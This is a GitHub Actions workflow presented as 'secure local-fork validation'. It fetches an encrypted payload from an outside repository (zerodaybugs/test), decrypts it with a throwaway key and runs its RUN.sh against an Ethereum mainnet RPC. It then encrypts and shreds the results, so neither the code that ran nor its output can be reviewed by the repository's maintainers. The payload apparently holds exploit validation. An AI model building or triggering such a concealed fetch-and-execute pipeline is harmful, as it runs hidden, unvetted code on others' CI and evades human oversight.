name: Secure encrypted local-fork validation 20260729

on:
  pull_request:
    branches: [main]
    paths:
      - 'secure-local-fork-request/**'
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: secure-local-fork-${{ github.event.pull_request.number || github.run_id }}
  cancel-in-progress: false

jobs:
  validate:
    runs-on: ubuntu-24.04
    timeout-minutes: 55
    steps:
      - name: Check out public request branch
        uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: v1.5.1

      - name: Generate ephemeral runner certificate
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p handshake-public
          umask 077
          openssl req -x509 -newkey rsa:4096 -sha256 -nodes -days 1 \
            -subj '/CN=ephemeral-secure-local-fork-runner' \
            -keyout /tmp/runner-private.pem \
            -out handshake-public/runner-certificate.pem \
            >/dev/null 2>&1
          openssl x509 -in handshake-public/runner-certificate.pem -noout -fingerprint -sha256 \
            > handshake-public/runner-certificate.sha256-fingerprint.txt
          printf '%s\n' "$GITHUB_RUN_ID" > handshake-public/run-id.txt
          chmod 600 /tmp/runner-private.pem
          chmod 644 handshake-public/*

      - name: Publish ephemeral runner certificate
        uses: actions/upload-artifact@v4
        with:
          name: secure-local-fork-handshake-${{ github.run_id }}
          path: handshake-public/
          if-no-files-found: error
          retention-days: 1

      - name: Retrieve encrypted payload bound to this run
        shell: bash
        run: |
          set -euo pipefail
          rm -rf /tmp/transport
          mkdir -p /tmp/transport
          found=0
          for attempt in $(seq 1 300); do
            rm -rf /tmp/transport/repo
            git clone --quiet --depth 1 --branch secure-local-fork-payload-20260729 \
              https://github.com/zerodaybugs/test.git /tmp/transport/repo 2>/dev/null || true
            payload_dir=/tmp/transport/repo/secure-local-fork-payload
            if test -s "$payload_dir/payload.cms.b64" \
               && test -s "$payload_dir/payload.cms.sha256" \
               && test -s "$payload_dir/run-id.txt" \
               && test "$(tr -d '\r\n' < "$payload_dir/run-id.txt")" = "$GITHUB_RUN_ID"; then
              base64 --decode "$payload_dir/payload.cms.b64" > /tmp/transport/payload.cms
              cp "$payload_dir/payload.cms.sha256" /tmp/transport/
              cp "$payload_dir/run-id.txt" /tmp/transport/
              found=1
              break
            fi
            sleep 5
          done
          test "$found" -eq 1
          test "$(tr -d '\r\n' < /tmp/transport/run-id.txt)" = "$GITHUB_RUN_ID"
          (cd /tmp/transport && sha256sum --check --strict payload.cms.sha256)

      - name: Decrypt and execute local-only fork validation
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p /tmp/secure-work/lib /tmp/secure-evidence encrypted-result

          openssl cms -decrypt -binary -inform DER \
            -in /tmp/transport/payload.cms \
            -recip handshake-public/runner-certificate.pem \
            -inkey /tmp/runner-private.pem \
            -out /tmp/secure-payload.tar.gz \
            >/dev/null 2>&1
          tar -xzf /tmp/secure-payload.tar.gz -C /tmp/secure-work
          (cd /tmp/secure-work && sha256sum --check --strict INPUT_SHA256SUMS)

          git clone --quiet --depth 1 --branch v1.9.6 \
            https://github.com/foundry-rs/forge-std.git /tmp/secure-work/lib/forge-std
          git clone --quiet --depth 1 --branch v5.2.0 \
            https://github.com/OpenZeppelin/openzeppelin-contracts.git \
            /tmp/secure-work/lib/openzeppelin-contracts

          curl -fsSL --retry 4 --retry-all-errors \
            'https://binaries.soliditylang.org/linux-amd64/solc-linux-amd64-v0.8.29+commit.ab55807c' \
            -o /tmp/secure-work/solc
          echo '18d418a40dc04d17656b1b5c8a7b35cfbab8942b51f38d005d5b59e8aa6637e0  /tmp/secure-work/solc' \
            | sha256sum --check --strict >/dev/null
          chmod 0755 /tmp/secure-work/solc
          export PATH="/tmp/secure-work:$PATH"

          set +e
          (cd /tmp/secure-work && \
            ETH_RPC_URL='https://ethereum-rpc.publicnode.com' ./RUN.sh)
          run_status=$?
          set -e
          printf 'runner_exit=%s\n' "$run_status" > /tmp/secure-work/evidence/RUNNER_EXIT_STATUS.txt
          forge --version > /tmp/secure-work/evidence/WORKFLOW_FORGE_VERSION.txt 2>&1
          /tmp/secure-work/solc --version > /tmp/secure-work/evidence/WORKFLOW_SOLC_VERSION.txt 2>&1
          (cd /tmp/secure-work/evidence && \
            find . -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS)
          tar -czf /tmp/secure-evidence.tar.gz -C /tmp/secure-work evidence

          openssl cms -encrypt -binary -aes-256-cbc -outform DER \
            -in /tmp/secure-evidence.tar.gz \
            -out encrypted-result/evidence.cms \
            /tmp/secure-work/researcher-certificate.pem \
            >/dev/null 2>&1
          sha256sum encrypted-result/evidence.cms > encrypted-result/evidence.cms.sha256
          printf 'encrypted-evidence-complete\n' > encrypted-result/STATUS.txt
          printf '%s\n' "$run_status" > encrypted-result/RUNNER_EXIT_STATUS.txt

          shred -u /tmp/runner-private.pem /tmp/secure-payload.tar.gz /tmp/secure-evidence.tar.gz 2>/dev/null || true
          rm -rf /tmp/secure-work /tmp/transport

      - name: Upload encrypted evidence only
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: secure-local-fork-result-${{ github.run_id }}
          path: encrypted-result/
          if-no-files-found: warn
          retention-days: 1
